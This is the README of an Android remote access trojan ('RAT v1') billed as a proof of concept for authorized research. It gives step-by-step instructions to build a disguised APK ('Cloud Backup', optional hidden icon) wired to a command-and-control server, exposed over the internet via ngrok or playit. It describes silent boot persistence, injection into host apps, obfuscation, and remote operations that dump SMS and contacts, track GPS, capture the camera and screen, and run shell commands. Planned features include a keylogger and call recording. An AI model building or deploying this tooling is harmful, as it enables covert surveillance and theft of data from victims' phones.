# Android RAT v1

Proof-of-concept Android Remote Access Tool for authorized security research.

## Requirements

- Python 3.10+
- **Java JDK 17 or 21** (JDK 25+ NOT supported - Kotlin plugin incompatible)
- ADB (Android Debug Bridge)
- Android device with USB debugging enabled

> **Note:** If build fails with `java.lang.IllegalArgumentException: 25.0.2`, you're running JDK 25. Download JDK 17 and either set `JAVA_HOME` or add `org.gradle.java.home=/path/to/jdk17` to `client/gradle.properties`.

## Quick Start

### 1. Setup Environment

```bash
# Windows
setup.bat

# Linux/macOS
chmod +x setup.sh
./setup.sh
```

### 2. Build APK with Custom C2 Address

```bash
python build.py --ip <YOUR_IP> --port 8667 --name "Cloud Backup"
```

**Parameters:**
| Flag | Default | Description |
|------|---------|-------------|
| `--ip` | *required* | C2 server IP address |
| `--port` | 8667 | C2 listener port |
| `--name` | Cloud Backup | App display name on device |
| `--install` | false | Auto-install via ADB after build |
| `--hide-icon` | false | Hide launcher icon after first run |

### 3. Start C2 Server

```bash
# Web dashboard (recommended)
python c2_web.py

# CLI listener
python c2.py --port 8667
```

Dashboard: `http://localhost:5006`

### 4. Install APK on Device

```bash
# USB install
adb install payloads/ratv1-release.apk

# Set up reverse tunnel (for USB testing)
adb reverse tcp:8667 tcp:8667
```

### 5. Open the App

Launch the app on the device. Agent will connect to C2 and register.

## Available Operations

| Op | Description |
|----|-------------|
| `sysinfo` | Device model, Android version, carrier |
| `gps` | GPS coordinates |
| `contacts` | Contact list export |
| `sms_read` | SMS message dump |
| `camera` | Front/rear camera capture |
| `screenshot` | Screen capture (requires MediaProjection grant) |
| `vnc` | Live screen stream |
| `apps` | Installed package list |
| `exec` | Shell command execution |

## Configuration

### Modify Listener Address

Edit `build.py` and rebuild:

```bash
python build.py --ip 192.168.1.100 --port 9000
```

Or for WAN access via playit.gg tunnel:

```bash
python wan.py --setup-playit
python wan.py
```

### Change App Name/Icon

```bash
python build.py --ip <IP> --name "System Service"
```

## Protocol

Wire format: `[4-byte big-endian length][UTF-8 JSON body]`

```json
// Agent registration
{"type": "register", "hostname": "device_model", "model": "...", "battery": 100}

// C2 task
{"type": "task", "task_id": "abc123", "op": "sysinfo"}

// Agent response
{"type": "result", "task_id": "abc123", "data": {...}}
```

## Project Structure

```
android_RATv1/
├── build.py          # APK builder with config injection
├── c2.py             # CLI C2 listener
├── c2_web.py         # Web dashboard C2
├── setup.py          # Android SDK setup
├── wan.py            # WAN tunneling (ngrok/playit)
├── obfuscate.py      # String encryption + ProGuard
├── binder.py         # APK injection into host apps
├── client/           # Android Kotlin source
│   └── app/src/main/
│       ├── kotlin/com/remote/ratv1/
│       │   ├── Config.kt        # C2 address (build-time injected)
│       │   ├── SyncService.kt   # Main foreground service
│       │   ├── Dispatcher.kt    # Task router
│       │   └── modules/         # Capability modules
│       └── AndroidManifest.xml
└── server/
    └── ratv1_gui.py             # Desktop GUI C2
```

## Troubleshooting

### "There is not enough space on the disk"

Gradle caches to `C:\Users\<user>\.gradle` by default. If C: is low on space:

```powershell
$env:GRADLE_USER_HOME = "E:\gradle_home"  # or another drive with space
python build.py --ip <IP> --install
```

### "Could not find or load main class org.gradle.wrapper.GradleWrapperMain"

The gradle-wrapper.jar is missing. Run:

```bash
python setup.py
```

If that doesn't fix it:

```powershell
cd client\gradle\wrapper
Invoke-WebRequest -Uri "https://github.com/gradle/gradle/raw/v8.7.0/gradle/wrapper/gradle-wrapper.jar" -OutFile gradle-wrapper.jar
```

## Persistence

The agent includes boot persistence — it auto-starts when the device reboots.

**How it works:**
- `StartReceiver` listens for `BOOT_COMPLETED` intent
- Launches `SyncService` as a foreground service
- Service reconnects to C2 with exponential backoff

**First run requirement:** User must open the app once after install to:
1. Grant runtime permissions (camera, contacts, SMS, etc.)
2. Disable battery optimization (keeps service alive)
3. Enable accessibility service (optional, for screen capture)

After initial setup, the agent survives reboots and runs silently.

---

## WAN Access (ngrok / playit.gg)

For testing over the internet (device not on USB):

### Option 1: ngrok

```bash
# Install ngrok and auth
ngrok authtoken <YOUR_TOKEN>

# Expose C2 port
ngrok tcp 8667
```

Note the forwarding address (e.g., `0.tcp.ngrok.io:12345`), then build with that:

```bash
python build.py --ip 0.tcp.ngrok.io --port 12345 --install
```

### Option 2: playit.gg (free, no account required)

```bash
python wan.py --setup-playit  # first time only
python wan.py                 # starts tunnel + C2
```

### Option 3: Port forwarding

If you control your router:
1. Forward external port 8667 → your PC's LAN IP:8667
2. Build with your public IP: `python build.py --ip <PUBLIC_IP>`
3. Ensure firewall allows inbound on 8667

---

## Troubleshooting

### "There is not enough space on the disk"

Gradle caches to `C:\Users\<user>\.gradle` by default. If C: is low on space:

```powershell
$env:GRADLE_USER_HOME = "E:\gradle_home"  # or another drive with space
python build.py --ip <IP> --install
```

### "Could not find or load main class org.gradle.wrapper.GradleWrapperMain"

The gradle-wrapper.jar is missing. Run:

```bash
python setup.py
```

If that doesn't fix it:

```powershell
cd client\gradle\wrapper
Invoke-WebRequest -Uri "https://github.com/gradle/gradle/raw/v8.7.0/gradle/wrapper/gradle-wrapper.jar" -OutFile gradle-wrapper.jar
```

### Agent not connecting

1. **Check ADB tunnel:** `adb reverse --list` should show `tcp:8667 tcp:8667`
2. **Re-establish tunnel:** `adb reverse tcp:8667 tcp:8667`
3. **Check app is running:** `adb shell ps -A | grep ratv1`
4. **Force restart app:** `adb shell am force-stop com.remote.ratv1 && adb shell am start -n com.remote.ratv1/.MainActivity`
5. **Check C2 is listening:** `netstat -ano | findstr 8667` should show LISTENING

### Permission denied errors

The agent needs runtime permissions granted by the user:

| Operation | Required Permission |
|-----------|---------------------|
| Camera | `android.permission.CAMERA` |
| GPS | `android.permission.ACCESS_FINE_LOCATION` |
| Contacts | `android.permission.READ_CONTACTS` |
| SMS | `android.permission.READ_SMS` |
| Screenshot | MediaProjection (system popup) |

Grant via: Settings → Apps → [App Name] → Permissions

### App killed in background

Samsung/Xiaomi/Huawei aggressively kill background apps. Fixes:
1. Disable battery optimization for the app
2. Lock the app in recent apps (swipe down on the card)
3. On Samsung: Settings → Battery → App Power Management → add to "Never sleeping"

---

## Future Development

- [ ] **TCP/UDP toggle** — UDP for lower latency, TCP for reliability
- [ ] **Domain fronting** — C2 over CDN (Cloudflare, AWS)
- [ ] **Payload encryption** — AES for wire traffic
- [ ] **Multi-agent management** — Web dashboard improvements
- [ ] **File exfiltration** — Download files from device
- [ ] **Keylogger** — Accessibility-based input capture
- [ ] **Call recording** — Record incoming/outgoing calls
- [ ] **Geofencing** — Trigger actions based on location

---

## Legal Notice

**For authorized security research and penetration testing only.**

Use only on devices you own or have explicit written permission to test.

Unauthorized access to computer systems is illegal under:
- Computer Fraud and Abuse Act (US)
- Computer Misuse Act (UK)
- Criminal Code Act 1995 (Australia)

The authors assume no liability for misuse.

## License

MIT
